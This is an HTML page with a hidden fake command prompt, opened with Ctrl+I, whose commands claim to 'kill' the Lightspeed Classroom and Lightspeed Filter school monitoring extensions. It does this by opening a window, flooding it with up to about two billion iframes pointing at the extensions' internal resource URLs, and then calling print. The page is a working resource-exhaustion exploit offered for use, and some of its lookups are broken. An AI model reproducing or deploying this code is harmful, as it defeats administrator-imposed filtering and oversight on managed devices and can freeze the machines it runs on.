<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CMD Prompt</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: monospace;
            margin: 0;
            padding: 0;
        }
    
        #cmd-box {
            opacity: 0;
            visibility: hidden;
            position: fixed;
            top: 20%;
            left: 50%;
            transform: translate(-50%, -20%);
            width: 400px;
            background: rgba(0, 0, 0, 0.9);
            border: 2px solid green;
            padding: 10px;
            opacity: 0;
            transition: opacity 0.5s ease-in-out;
            box-shadow: 0 0 15px green;
            border-radius: 5px;
        }
    
        .visible {
            display: block;
            opacity: 1;
        }
    
        #history {
            max-height: 200px;
            overflow-y: auto;
            /* Hide scrollbar for Chrome, Safari, and Opera */
            scrollbar-width: none; /* Firefox */
            -ms-overflow-style: none; /* IE and Edge */
        }
    
        /* Hide scrollbar for Chrome, Safari, and Opera */
        #history::-webkit-scrollbar {
            display: none;
        }
    
        input {
            width: 100%;
            background: black;
            color: green;
            border: none;
            outline: none;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <div id="cmd-box">
        <div id="history"></div>
        <p>C:\User></p>
        <input type="text" id="cmd-input" autofocus>
    </div>

    <script>
        // Add the extensions and icons definitions here
        const extensions = {
            "Lightspeed Classroom": "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png",
            "Lightspeed Filter Agent": "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png",
        };

        const icons = {
            // icons
        };

        let commandHistory = [];
        let historyIndex = -1;
        let defaultIframes = 2147483647; // Default number of iframes

        document.addEventListener("keydown", function (event) {
            if (event.ctrlKey && event.key === "i") {
                event.preventDefault();
                let cmdBox = document.getElementById("cmd-box");
                cmdBox.style.visibility = "visible";
                cmdBox.style.opacity = "1";
                document.getElementById("cmd-input").focus();
            }
        });

        document.getElementById("cmd-input").addEventListener("keydown", function (event) {
            if (event.key === "Enter") {
                let command = this.value.trim().toLowerCase();
                let history = document.getElementById("history");
                let output = "";

                if (command.startsWith("iframes")) {
                    let parts = command.split(" ");
                    if (parts.length > 1 && !isNaN(parts[1])) {
                        defaultIframes = parseInt(parts[1]);
                        output = `Default iframes set to ${defaultIframes}`;
                    } else {
                        output = `Current default iframes: ${defaultIframes}`;
                    }
                } else if (command === "time") {
                    output = new Date().toLocaleTimeString();
                } else if (command === "clear") {
                    history.innerHTML = "";
                    this.value = "";
                    return;
                } else if (command === "disablelightspeedclassroom") {
                    output = "Disabling Lightspeed Classroom...";
                    disableLightspeedClassroom();
                } else if (command === "disablelightspeedfilter") {
                    output = "Disabling Lightspeed Filter...";
                    disableLightspeedFilter();
                } else {
                    output = "Command not recognized";
                }

                commandHistory.push(command);
                historyIndex = commandHistory.length;

                let newEntry = document.createElement("p");
                newEntry.textContent = `C:\\User> ${command}`;
                history.appendChild(newEntry);

                if (output) {
                    let response = document.createElement("p");
                    response.textContent = output;
                    history.appendChild(response);
                }

                history.scrollTop = history.scrollHeight;
                this.value = "";
            } else if (event.key === "ArrowUp") {
                event.preventDefault();
                if (historyIndex > 0) {
                    historyIndex--;
                    this.value = commandHistory[historyIndex];
                }
            } else if (event.key === "ArrowDown") {
                event.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    this.value = commandHistory[historyIndex];
                } else {
                    historyIndex = commandHistory.length;
                    this.value = "";
                }
            }
        });

        function disableLightspeedClassroom() {
            const extName = "Lightspeed Classroom";
            const extPage = extensions[extName]; // Fetch the URL from the extensions object
            const extIcon = icons[extName]; // Fetch the icon from the icons object
            const extId = "kkbmdgjggcdajckdlbngdjonpchpaiea"; // Extension ID

            // Automatically disable the extension without a popup
            createIframesAndPrint(extPage, extIcon);

            // Add a message to the command history
            let history = document.getElementById("history");
            let response = document.createElement("p");
            response.textContent = "Lightspeed Classroom has been killed!";
            history.appendChild(response);
            history.scrollTop = history.scrollHeight;
        }

        function disableLightspeedFilter() {
            const extName = "Lightspeed Filter";
            const extPage = extensions[extName]; // Fetch the URL from the extensions object
            const extIcon = icons[extName]; // Fetch the icon from the icons object
            const extId = "adkcpkpghahmbopkjchobieckeoaoeem"; // Extension ID

            // Automatically disable the extension without a popup
            createIframesAndPrint(extPage, extIcon);

            // Add a message to the command history
            let history = document.getElementById("history");
            let response = document.createElement("p");
            response.textContent = "Lightspeed Filter has been killed!";
            history.appendChild(response);
            history.scrollTop = history.scrollHeight;
        }

        function createIframesAndPrint(extPage, extIcon) {
            const maxIframes = defaultIframes; // Use the defaultIframes value
            const numTabs = 1; // Number of tabs to open
            const iframesPerTab = Math.floor(maxIframes / numTabs); // Iframes per tab

            for (let tab = 0; tab < numTabs; tab++) {
                let printerWindow = window.open("", "_blank");
                printerWindow.document.title = 'Disable';
                printerWindow.document.body.style.backgroundColor = '#1e1f22';

                let icon = printerWindow.document.createElement('link');
                icon.rel = 'icon';
                icon.href = extIcon;
                icon.type = 'image/x-icon';
                printerWindow.document.head.appendChild(icon);

                let printerBody = printerWindow.document.body;

                let loadingContainer = printerWindow.document.createElement("div");
                loadingContainer.style.position = "fixed";
                loadingContainer.style.top = "50%";
                loadingContainer.style.left = "50%";
                loadingContainer.style.transform = "translate(-50%, -50%)";
                loadingContainer.style.color = "white";
                loadingContainer.style.fontSize = "20px";
                loadingContainer.style.fontFamily = "'Roboto', sans-serif";
                loadingContainer.style.textAlign = "center";

                let spinner = printerWindow.document.createElement("div");
                spinner.style.border = "4px solid rgba(255, 255, 255, 0.3)";
                spinner.style.borderTop = "4px solid white";
                spinner.style.borderRadius = "50%";
                spinner.style.width = "40px";
                spinner.style.height = "40px";
                spinner.style.animation = "spin 1s linear infinite";
                spinner.style.margin = "0 auto 10px";

                let loadingText = printerWindow.document.createElement("div");
                loadingText.innerText = "Loading...";

                loadingContainer.appendChild(spinner);
                loadingContainer.appendChild(loadingText);
                printerBody.appendChild(loadingContainer);

                let style = printerWindow.document.createElement("style");
                style.innerHTML = `
                    @keyframes spin {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(360deg); }
                    }
                `;
                printerWindow.document.head.appendChild(style);

                let script = printerWindow.document.createElement("script");
                script.innerHTML = `
                    setTimeout(() => {
                        window.close();
                    }, 5000);
                `;
                printerWindow.document.body.appendChild(script);

                // Create iframes in batches to avoid blocking the main thread
                let batchSize = 1000; // Number of iframes to create per batch
                let totalIframes = 0;

                function createIframeBatch() {
                    for (let i = 0; i < batchSize && totalIframes < iframesPerTab; i++) {
                        const iframe = document.createElement('iframe');
                        iframe.src = extPage;
                        iframe.width = "25px";
                        iframe.height = "25px";
                        iframe.style.border = "none";
                        printerBody.appendChild(iframe);
                        totalIframes++;
                    }

                    if (totalIframes < iframesPerTab) {
                        setTimeout(createIframeBatch, 0); // Schedule the next batch
                    } else {
                        loadingContainer.remove();
                        printerWindow.print();
                        let iframes = printerWindow.document.querySelectorAll("iframe");
                        iframes.forEach(iframe => iframe.remove());
                    }
                }

                createIframeBatch(); // Start creating iframes
            }
        }
    </script>
</body>
</html>